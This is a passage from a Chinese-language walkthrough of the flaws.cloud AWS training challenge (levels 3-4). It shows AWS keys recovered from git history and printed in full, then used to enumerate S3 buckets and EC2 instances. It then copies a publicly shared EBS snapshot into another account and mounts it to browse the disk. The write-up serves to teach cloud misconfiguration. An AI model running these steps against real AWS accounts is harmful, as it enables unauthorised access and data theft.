<pre class="language-shell" data-language="shell"><code class="language-shell">~<span class="token punctuation">\</span>testtest$ <span class="token function">git</span> log

commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 <span class="token punctuation">(</span>HEAD -<span class="token operator">></span> master<span class="token punctuation">)</span>
Author: 0xdabbad00 <span class="token operator">&lt;</span>scott@summitroute.com<span class="token operator">></span>
Date:   Sun Sep <span class="token number">17</span> 09:10:43 <span class="token number">2017</span> -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <span class="token operator">&lt;</span>scott@summitroute.com<span class="token operator">></span>
Date:   Sun Sep <span class="token number">17</span> 09:10:07 <span class="token number">2017</span> -0600

    first commit</code></pre>

<p>可以看到，开发人员在提交<code>f52ec03b227ea609b04e43f475fb0126edb5a61</code>时有他不想要的东西，并在提交<code>b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526</code>时删除了它。</p>
<p>查看<code>f52ec03b227ea609b04e43f475fb0126edb5a61</code>这一提交：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~<span class="token punctuation">\</span>testtest$ <span class="token function">git</span> checkout f52ec03b227ea6094b04e43f475fb0126edb5a61

Note: checking out <span class="token string">'f52ec03b227ea6094b04e43f475fb0126edb5a61'</span><span class="token builtin class-name">.</span>

You are <span class="token keyword">in</span> <span class="token string">'detached HEAD'</span> state. You can <span class="token function">look</span> around, <span class="token function">make</span> experimental
changes and commit them, and you can discard any commits you <span class="token function">make</span> <span class="token keyword">in</span> this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
<span class="token keyword">do</span> so <span class="token punctuation">(</span>now or later<span class="token punctuation">)</span> by using -b with the checkout <span class="token builtin class-name">command</span> again. Example:

  <span class="token function">git</span> checkout -b <span class="token operator">&lt;</span>new-branch-name<span class="token operator">></span>

HEAD is now at f52ec03 first commit</code></pre>

<p>再次查看目录中包含的文件，发现<code>access_keys.txt</code>：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~/testtest$ <span class="token function">ls</span>

access_keys.txt  authenticated_users.png  hint1.html  hint2.html  hint3.html </code></pre>

<p>查看<code>access_keys.txt</code>的内容：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~/testtest$ <span class="token function">cat</span> access_keys.txt

access_key AKIAJ366LIPB4IJKT7SA
secret_access_key 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</code></pre>

<p>用获得的<code>access_keys</code>配置AWS CLI：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~/testtest$ aws configure --profile flaws
AWS Access Key ID <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: AKIAJ366LIPB4IJKT7SA
AWS Secret Access Key <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: OdNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83Jys
Default region name <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: us-west-2
Default output <span class="token function">format</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span>:</code></pre>

<p>用这个账户权限看看S3存储桶中有什么有意思的内容：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws s3 <span class="token function">ls</span> --profile flaws

<span class="token number">2017</span>-02-19 03:41:52 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
<span class="token number">2017</span>-05-30 00:34:53 config-bucket-975426262029
<span class="token number">2018</span>-07-08 00:09:49 flaws-logs
<span class="token number">2017</span>-02-19 03:40:54 flaws.cloud
<span class="token number">2017</span>-02-24 <span class="token number">13</span>:15:42 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
<span class="token number">2017</span>-02-27 02:29:03 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
<span class="token number">2017</span>-02-27 02:49:31 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
<span class="token number">2017</span>-02-27 03:49:03 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
<span class="token number">2017</span>-02-27 03:48:40 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
<span class="token number">2017</span>-02-27 04:07:13 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud</code></pre>

<p>成功通关level 3，并找到level 4的入口。</p>
<h2 id="0x04-Level-1-3-小结"><a href="#0x04-Level-1-3-小结" class="headerlink" title="0x04 Level 1-3 小结"></a>0x04 Level 1-3 小结</h2><p>至此，涉及到S3存储桶的挑战（level 1-3）已经全部通关，这里进行一个小结：</p>
<p>在AWS中，可以在S3存桶中可以配置各种权限的功能，包括用来托管静态网站。如果使用了过于宽松的权限，比如将访问权限设置为<code>Everyone</code>，就有可能像访问Web服务器目录列表一样访问S3存储桶的列表，就可能造成信息泄露。hackone平台上的几个类似的漏洞报告，包括针对Shopify、Udemy等厂家的S3文件目录暴露，读写S3的权限等：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/163476">https://hackerone.com/reports/163476</a> ，<a target="_blank" rel="noopener" href="https://hackerone.com/reports/57505">https://hackerone.com/reports/57505</a> ，<a target="_blank" rel="noopener" href="https://hackerone.com/reports/111643">https://hackerone.com/reports/111643</a> ，<a target="_blank" rel="noopener" href="https://hackerone.com/reports/131468">https://hackerone.com/reports/131468</a> 。</p>
<p>如果出现的了将访问权限错误的这是为<code>Any Authenticated AWS User</code>，即任何身份认证的AWS用户，而错误的认为这只是对自己的其他用户开放，依然会造成一个跨权限的访问。这里给出hackerone平台上针对Shopify的一个漏洞报告进行参考：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/98819">https://hackerone.com/reports/98819</a> 。</p>
<p>AWS秘钥泄露时常出现，这里提供一篇关于Instagram的百万美元的漏洞文章进行学习——Instagram’s Million Dollar Bug：<a target="_blank" rel="noopener" href="http://www.exfiltrated.com/research-Instagram-RCE.php">http://www.exfiltrated.com/research-Instagram-RCE.php</a> 。这篇文章中，安全研究员发现了一系列缺陷，包括一个S3桶，其中包含.tar.gz存档的各种修订文件，而其中一个档案包含了<code>AWS credentials</code>，使得研究人员访问所Instagram所有的S3存储桶。</p>
<h2 id="0x05-Level-4"><a href="#0x05-Level-4" class="headerlink" title="0x05 Level 4"></a>0x05 Level 4</h2><blockquote>
<p>For the next level, you need to get access to the web page running on an EC2 at <a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/">4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</a></p>
<p>It’ll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.</p>
</blockquote>
<p>我们的目标是进入<code>4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</code>，直接用浏览器打开，提示需要账号密码：</p>
<p><img src="https://p4.ssl.qhimg.com/t01702b4808c239fe1a.png" srcset="/img/loading.gif"></p>
<p><img src="https://p1.ssl.qhimg.com/t01cd5df690a898e118.png" srcset="/img/loading.gif"></p>
<p>在level 4 挑战的描述中，我们知道，当nginx在EC2上部署后，会创建一个快照（EBS snapshot）。由这一思路出发，利用level 3中取得的账户查询flaws上运行的EC2实例的信息:</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws ec2 describe-instances --profile flaws

<span class="token punctuation">&#123;</span>
    <span class="token string">"Reservations"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span>
            <span class="token string">"Instances"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token punctuation">&#123;</span>
                    <span class="token string">"Monitoring"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token string">"State"</span><span class="token builtin class-name">:</span> <span class="token string">"disabled"</span>
                    <span class="token punctuation">&#125;</span>,
                    <span class="token string">"PublicDnsName"</span><span class="token builtin class-name">:</span> <span class="token string">"ec2-35-165-182-7.us-west-2.compute.amazonaws.com"</span>,
                    <span class="token string">"StateReason"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token string">"Message"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
                        <span class="token string">"Code"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>
                    <span class="token punctuation">&#125;</span>,
                    <span class="token string">"State"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token string">"Code"</span><span class="token builtin class-name">:</span> <span class="token number">16</span>,
                        <span class="token string">"Name"</span><span class="token builtin class-name">:</span> <span class="token string">"running"</span>
                    <span class="token punctuation">&#125;</span>,
                    <span class="token string">"EbsOptimized"</span><span class="token builtin class-name">:</span> false,
                    <span class="token string">"LaunchTime"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-12T22:29:24.000Z"</span>,
                    <span class="token string">"PublicIpAddress"</span><span class="token builtin class-name">:</span> <span class="token string">"35.165.182.7"</span>,
                    <span class="token string">"PrivateIpAddress"</span><span class="token builtin class-name">:</span> <span class="token string">"172.31.41.84"</span>,
                    <span class="token string">"ProductCodes"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,
                    <span class="token string">"VpcId"</span><span class="token builtin class-name">:</span> <span class="token string">"vpc-1052ce77"</span>,
                    <span class="token string">"CpuOptions"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token string">"CoreCount"</span><span class="token builtin class-name">:</span> <span class="token number">1</span>,
                        <span class="token string">"ThreadsPerCore"</span><span class="token builtin class-name">:</span> <span class="token number">1</span>
                    <span class="token punctuation">&#125;</span>,
                    <span class="token string">"StateTransitionReason"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
                    <span class="token string">"InstanceId"</span><span class="token builtin class-name">:</span> <span class="token string">"i-05bef8a081f307783"</span>,
                    <span class="token string">"ImageId"</span><span class="token builtin class-name">:</span> <span class="token string">"ami-7c803d1c"</span>,
                    <span class="token string">"PrivateDnsName"</span><span class="token builtin class-name">:</span> <span class="token string">"ip-172-31-41-84.us-west-2.compute.internal"</span>,
                    <span class="token string">"KeyName"</span><span class="token builtin class-name">:</span> <span class="token string">"Default"</span>,
                    <span class="token string">"SecurityGroups"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                        <span class="token punctuation">&#123;</span>
                            <span class="token string">"GroupName"</span><span class="token builtin class-name">:</span> <span class="token string">"launch-wizard-1"</span>,
                            <span class="token string">"GroupId"</span><span class="token builtin class-name">:</span> <span class="token string">"sg-490f6631"</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">]</span>,
                    <span class="token string">"ClientToken"</span><span class="token builtin class-name">:</span> <span class="token string">"kTOiC1486938563883"</span>,
                    <span class="token string">"SubnetId"</span><span class="token builtin class-name">:</span> <span class="token string">"subnet-d962aa90"</span>,
                    <span class="token string">"InstanceType"</span><span class="token builtin class-name">:</span> <span class="token string">"t2.micro"</span>,
                    <span class="token string">"CapacityReservationSpecification"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token string">"CapacityReservationPreference"</span><span class="token builtin class-name">:</span> <span class="token string">"open"</span>
                    <span class="token punctuation">&#125;</span>,
                    <span class="token string">"NetworkInterfaces"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                        <span class="token punctuation">&#123;</span>
                            <span class="token string">"Status"</span><span class="token builtin class-name">:</span> <span class="token string">"in-use"</span>,
                            <span class="token string">"MacAddress"</span><span class="token builtin class-name">:</span> <span class="token string">"06:b0:7a:92:21:cf"</span>,
                            <span class="token string">"SourceDestCheck"</span><span class="token builtin class-name">:</span> true,
                            <span class="token string">"VpcId"</span><span class="token builtin class-name">:</span> <span class="token string">"vpc-1052ce77"</span>,
                            <span class="token string">"Description"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
                            <span class="token string">"NetworkInterfaceId"</span><span class="token builtin class-name">:</span> <span class="token string">"eni-c26ed780"</span>,
                            <span class="token string">"PrivateIpAddresses"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                                <span class="token punctuation">&#123;</span>
                                    <span class="token string">"PrivateDnsName"</span><span class="token builtin class-name">:</span> <span class="token string">"ip-172-31-41-84.us-west-2.compute.internal"</span>,
                                    <span class="token string">"PrivateIpAddress"</span><span class="token builtin class-name">:</span> <span class="token string">"172.31.41.84"</span>,
                                    <span class="token string">"Primary"</span><span class="token builtin class-name">:</span> true,
                                    <span class="token string">"Association"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                                        <span class="token string">"PublicIp"</span><span class="token builtin class-name">:</span> <span class="token string">"35.165.182.7"</span>,
                                        <span class="token string">"PublicDnsName"</span><span class="token builtin class-name">:</span> <span class="token string">"ec2-35-165-182-7.us-west-2.compute.amazonaws.com"</span>,
                                        <span class="token string">"IpOwnerId"</span><span class="token builtin class-name">:</span> <span class="token string">"amazon"</span>
                                    <span class="token punctuation">&#125;</span>
                                <span class="token punctuation">&#125;</span>
                            <span class="token punctuation">]</span>,
                            <span class="token string">"PrivateDnsName"</span><span class="token builtin class-name">:</span> <span class="token string">"ip-172-31-41-84.us-west-2.compute.internal"</span>,
                            <span class="token string">"InterfaceType"</span><span class="token builtin class-name">:</span> <span class="token string">"interface"</span>,
                            <span class="token string">"Attachment"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                                <span class="token string">"Status"</span><span class="token builtin class-name">:</span> <span class="token string">"attached"</span>,
                                <span class="token string">"DeviceIndex"</span><span class="token builtin class-name">:</span> <span class="token number">0</span>,
                                <span class="token string">"DeleteOnTermination"</span><span class="token builtin class-name">:</span> true,
                                <span class="token string">"AttachmentId"</span><span class="token builtin class-name">:</span> <span class="token string">"eni-attach-a4901fc2"</span>,
                                <span class="token string">"AttachTime"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-12T22:29:24.000Z"</span>
                            <span class="token punctuation">&#125;</span>,
                            <span class="token string">"Groups"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                                <span class="token punctuation">&#123;</span>
                                    <span class="token string">"GroupName"</span><span class="token builtin class-name">:</span> <span class="token string">"launch-wizard-1"</span>,
                                    <span class="token string">"GroupId"</span><span class="token builtin class-name">:</span> <span class="token string">"sg-490f6631"</span>
                                <span class="token punctuation">&#125;</span>
                            <span class="token punctuation">]</span>,
                            <span class="token string">"Ipv6Addresses"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,
                            <span class="token string">"OwnerId"</span><span class="token builtin class-name">:</span> <span class="token string">"975426262029"</span>,
                            <span class="token string">"PrivateIpAddress"</span><span class="token builtin class-name">:</span> <span class="token string">"172.31.41.84"</span>,
                            <span class="token string">"SubnetId"</span><span class="token builtin class-name">:</span> <span class="token string">"subnet-d962aa90"</span>,
                            <span class="token string">"Association"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                                <span class="token string">"PublicIp"</span><span class="token builtin class-name">:</span> <span class="token string">"35.165.182.7"</span>,
                                <span class="token string">"PublicDnsName"</span><span class="token builtin class-name">:</span> <span class="token string">"ec2-35-165-182-7.us-west-2.compute.amazonaws.com"</span>,
                                <span class="token string">"IpOwnerId"</span><span class="token builtin class-name">:</span> <span class="token string">"amazon"</span>
                            <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">]</span>,
                    <span class="token string">"SourceDestCheck"</span><span class="token builtin class-name">:</span> true,
                    <span class="token string">"Placement"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token string">"Tenancy"</span><span class="token builtin class-name">:</span> <span class="token string">"default"</span>,
                        <span class="token string">"GroupName"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
                        <span class="token string">"AvailabilityZone"</span><span class="token builtin class-name">:</span> <span class="token string">"us-west-2a"</span>
                    <span class="token punctuation">&#125;</span>,
                    <span class="token string">"Hypervisor"</span><span class="token builtin class-name">:</span> <span class="token string">"xen"</span>,
                    <span class="token string">"BlockDeviceMappings"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                        <span class="token punctuation">&#123;</span>
                            <span class="token string">"DeviceName"</span><span class="token builtin class-name">:</span> <span class="token string">"/dev/sda1"</span>,
                            <span class="token string">"Ebs"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                                <span class="token string">"Status"</span><span class="token builtin class-name">:</span> <span class="token string">"attached"</span>,
                                <span class="token string">"DeleteOnTermination"</span><span class="token builtin class-name">:</span> true,
                                <span class="token string">"VolumeId"</span><span class="token builtin class-name">:</span> <span class="token string">"vol-04f1c039bc13ea950"</span>,
                                <span class="token string">"AttachTime"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-12T22:29:25.000Z"</span>
                            <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">]</span>,
                    <span class="token string">"Architecture"</span><span class="token builtin class-name">:</span> <span class="token string">"x86_64"</span>,
                    <span class="token string">"RootDeviceType"</span><span class="token builtin class-name">:</span> <span class="token string">"ebs"</span>,
                    <span class="token string">"IamInstanceProfile"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token string">"Id"</span><span class="token builtin class-name">:</span> <span class="token string">"AIPAIK7LV6U6UXJXQQR3Q"</span>,
                        <span class="token string">"Arn"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:iam::975426262029:instance-profile/flaws"</span>
                    <span class="token punctuation">&#125;</span>,
                    <span class="token string">"RootDeviceName"</span><span class="token builtin class-name">:</span> <span class="token string">"/dev/sda1"</span>,
                    <span class="token string">"VirtualizationType"</span><span class="token builtin class-name">:</span> <span class="token string">"hvm"</span>,
                    <span class="token string">"HibernationOptions"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token string">"Configured"</span><span class="token builtin class-name">:</span> <span class="token boolean">false</span>
                    <span class="token punctuation">&#125;</span>,
                    <span class="token string">"MetadataOptions"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token string">"State"</span><span class="token builtin class-name">:</span> <span class="token string">"applied"</span>,
                        <span class="token string">"HttpEndpoint"</span><span class="token builtin class-name">:</span> <span class="token string">"enabled"</span>,
                        <span class="token string">"HttpTokens"</span><span class="token builtin class-name">:</span> <span class="token string">"optional"</span>,
                        <span class="token string">"HttpPutResponseHopLimit"</span><span class="token builtin class-name">:</span> <span class="token number">1</span>
                    <span class="token punctuation">&#125;</span>,
                    <span class="token string">"AmiLaunchIndex"</span><span class="token builtin class-name">:</span> <span class="token number">0</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">]</span>,
            <span class="token string">"ReservationId"</span><span class="token builtin class-name">:</span> <span class="token string">"r-0fe151dbbe77e90cc"</span>,
            <span class="token string">"Groups"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,
            <span class="token string">"OwnerId"</span><span class="token builtin class-name">:</span> <span class="token string">"975426262029"</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>在返回的信息中，在<code>EBS</code>中找到<code>VolumeId</code>，在<code>Association</code>中找到公有IP</p>
<p><img src="https://p5.ssl.qhimg.com/t01cb1c4ac118142b80.png" srcset="/img/loading.gif"></p>
<p><img src="https://p0.ssl.qhimg.com/t01dab8ab43585c552b.png" srcset="/img/loading.gif"></p>
<p>也就是说，有一个EC2实例在运行，它的<code>VolumeId</code>为<code>vol-04f1c039bc13ea950</code>，IP地址为<code>35.165.182.7</code>。</p>
<p>为了确认这一发现，利用<code>nslookup</code>工具对level 4中的EC2地址进行解析，发现IP对应一致：</p>
<p><img src="https://p1.ssl.qhimg.com/t01e8a1ea1ccebfd490.png" srcset="/img/loading.gif"></p>
<p>那么，下一步要做到的就是通过<code>VolumeId</code>寻找EBS快照，看看能不能发现有用的信息：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws ec2 describe-snapshots --filters <span class="token string">"Name=volume-id, Values=vol-04f1c039bc13ea950"</span> --profile flaws

<span class="token punctuation">&#123;</span>
    <span class="token string">"Snapshots"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span>
            <span class="token string">"Description"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"Tags"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token punctuation">&#123;</span>
                    <span class="token string">"Value"</span><span class="token builtin class-name">:</span> <span class="token string">"flaws backup 2017.02.27"</span>,
                    <span class="token string">"Key"</span><span class="token builtin class-name">:</span> <span class="token string">"Name"</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">]</span>,
            <span class="token string">"Encrypted"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"VolumeId"</span><span class="token builtin class-name">:</span> <span class="token string">"vol-04f1c039bc13ea950"</span>,
            <span class="token string">"State"</span><span class="token builtin class-name">:</span> <span class="token string">"completed"</span>,
            <span class="token string">"VolumeSize"</span><span class="token builtin class-name">:</span> <span class="token number">8</span>,
            <span class="token string">"StartTime"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-28T01:35:12.000Z"</span>,
            <span class="token string">"Progress"</span><span class="token builtin class-name">:</span> <span class="token string">"100%"</span>,
            <span class="token string">"OwnerId"</span><span class="token builtin class-name">:</span> <span class="token string">"975426262029"</span>,
            <span class="token string">"SnapshotId"</span><span class="token builtin class-name">:</span> <span class="token string">"snap-0b49342abd1bdcb89"</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>这里找到<code>&quot;SnapshotId&quot;: &quot;snap-0b49342abd1bdcb89&quot;</code>，接着检查这个快照的<code>createVolumePermission</code>：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile flaws

<span class="token punctuation">&#123;</span>
    <span class="token string">"SnapshotId"</span><span class="token builtin class-name">:</span> <span class="token string">"snap-0b49342abd1bdcb89"</span>,
    <span class="token string">"CreateVolumePermissions"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span>
            <span class="token string">"Group"</span><span class="token builtin class-name">:</span> <span class="token string">"all"</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>哇偶！每个人都能基于这个快照创建一个卷。那么现在就使用自己的AWS账号创建这个快照的卷，这样就能使用自己的SSH秘钥登录EC2实例：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws ec2 create-volume --region us-west-2 --availability-zone us-west-2a --snapshot-id snap-0b49342abd1bdcb89

<span class="token punctuation">&#123;</span>
    <span class="token string">"AvailabilityZone"</span><span class="token builtin class-name">:</span> <span class="token string">"us-west-2a"</span>,
    <span class="token string">"MultiAttachEnabled"</span><span class="token builtin class-name">:</span> false,
    <span class="token string">"Tags"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,
    <span class="token string">"Encrypted"</span><span class="token builtin class-name">:</span> false,
    <span class="token string">"VolumeType"</span><span class="token builtin class-name">:</span> <span class="token string">"gp2"</span>,
    <span class="token string">"VolumeId"</span><span class="token builtin class-name">:</span> <span class="token string">"vol-00b0a21eafbe8f81b"</span>,
    <span class="token string">"State"</span><span class="token builtin class-name">:</span> <span class="token string">"creating"</span>,
    <span class="token string">"Iops"</span><span class="token builtin class-name">:</span> <span class="token number">100</span>,
    <span class="token string">"SnapshotId"</span><span class="token builtin class-name">:</span> <span class="token string">"snap-0b49342abd1bdcb89"</span>,
    <span class="token string">"CreateTime"</span><span class="token builtin class-name">:</span> <span class="token string">"2020-03-22T08:43:49.000Z"</span>,
    <span class="token string">"Size"</span><span class="token builtin class-name">:</span> <span class="token number">8</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>在我自己账户的EC2管理平台上，可以看到基于这个快照的卷成功创建：</p>
<p><img src="https://p0.ssl.qhimg.com/t0146400bfcb5c37686.png" srcset="/img/loading.gif"></p>
<p>随后我开启了一个免费的EC2实例：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws ec2 describe-instances

<span class="token punctuation">&#123;</span>
    <span class="token punctuation">..</span>.
    <span class="token string">"InstanceId"</span><span class="token builtin class-name">:</span> <span class="token string">"i-056b17b87e47e8896"</span>,
    <span class="token punctuation">..</span>.
<span class="token punctuation">&#125;</span></code></pre>

<p>下面将卷挂载在/dev/sdf：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws ec2 attach-volume --volume-id vol-00b0a21eafbe8f81b --instance-id i-056b17b87e47e8896 --device /dev/sdf

<span class="token punctuation">&#123;</span>
<span class="token punctuation">..</span>.
    <span class="token string">"State"</span><span class="token builtin class-name">:</span> <span class="token string">"attaching"</span>,
    <span class="token string">"Device"</span><span class="token builtin class-name">:</span> <span class="token string">"/dev/sdf"</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>当我们用自己的SSH秘钥登录这个EC2实例，就能进入快照找寻敏感信息或者文件：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ <span class="token function">ssh</span> -i <span class="token operator">&lt;</span>mykey<span class="token operator">></span> ubuntu@34.*.*.*.*
Welcome to Ubuntu <span class="token number">18.04</span>.3 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">4.15</span>.0-1057-aws x86_64<span class="token punctuation">)</span>Welcome to Ubuntu <span class="token number">18.04</span>.3 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">4.15</span>.0-1057-aws x86_64<span class="token punctuation">)</span>

<span class="token punctuation">..</span>.

ubuntu@ip-172-31-21-33:~$ lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0     <span class="token number">7</span>:0    <span class="token number">0</span> <span class="token number">89</span>.1M  <span class="token number">1</span> loop /snap/core/8268
loop1     <span class="token number">7</span>:1    <span class="token number">0</span>   18M  <span class="token number">1</span> loop /snap/amazon-ssm-agent/1480
xvda    <span class="token number">202</span>:0    <span class="token number">0</span>    8G  <span class="token number">0</span> disk
└─xvda1 <span class="token number">202</span>:1    <span class="token number">0</span>    8G  <span class="token number">0</span> part /
xvdf    <span class="token number">202</span>:80   <span class="token number">0</span>    8G  <span class="token number">0</span> disk
└─xvdf1 <span class="token number">202</span>:81   <span class="token number">0</span>    8G  <span class="token number">0</span> part</code></pre>

<p>可以发现这里有个虚拟盘/dev/xvdf1，创建一个挂载点：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">ubuntu@ip-172-31-21-33:~$ <span class="token function">sudo</span> <span class="token function">mkdir</span> /mnt/flaws
ubuntu@ip-172-31-21-33:~$ <span class="token function">sudo</span> <span class="token function">mount</span> /dev/xvdf1 /mnt/flaws
ubuntu@ip-172-31-21-33:~$ <span class="token function">mount</span>
<span class="token punctuation">..</span>.
/dev/xvdf1 on /mnt/flaws <span class="token builtin class-name">type</span> ext4 <span class="token punctuation">(</span>rw,relatime,data<span class="token operator">=</span>ordered<span class="token punctuation">)</span></code></pre>

<p>下面进入，看看能发现什么：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">ubuntu@ip-172-31-21-33:~$ <span class="token function">ls</span> -l /mnt/flaws/
total <span class="token number">104</span>
drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Feb <span class="token number">13</span>  <span class="token number">2017</span> bin
drwxr-xr-x  <span class="token number">3</span> root root  <span class="token number">4096</span> Feb <span class="token number">22</span>  <span class="token number">2017</span> boot
drwxr-xr-x  <span class="token number">5</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> dev
drwxr-xr-x <span class="token number">94</span> root root  <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2017</span> etc
drwxr-xr-x  <span class="token number">3</span> root root  <span class="token number">4096</span> Feb <span class="token number">12</span>  <span class="token number">2017</span> home
lrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">32</span> Feb <span class="token number">22</span>  <span class="token number">2017</span> initrd.img -<span class="token operator">></span> boot/initrd.img-4.4.0-64-generic
lrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">32</span> Feb <span class="token number">21</span>  <span class="token number">2017</span> initrd.img.old -<span class="token operator">></span> boot/initrd.img-4.4.0-63-generic
drwxr-xr-x <span class="token number">21</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> lib
drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> lib64
drwx------  <span class="token number">2</span> root root <span class="token number">16384</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> lost+found
drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> media
drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> mnt
drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> opt
drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Apr <span class="token number">12</span>  <span class="token number">2016</span> proc
drwx------  <span class="token number">3</span> root root  <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2017</span> root
drwxr-xr-x  <span class="token number">6</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> run
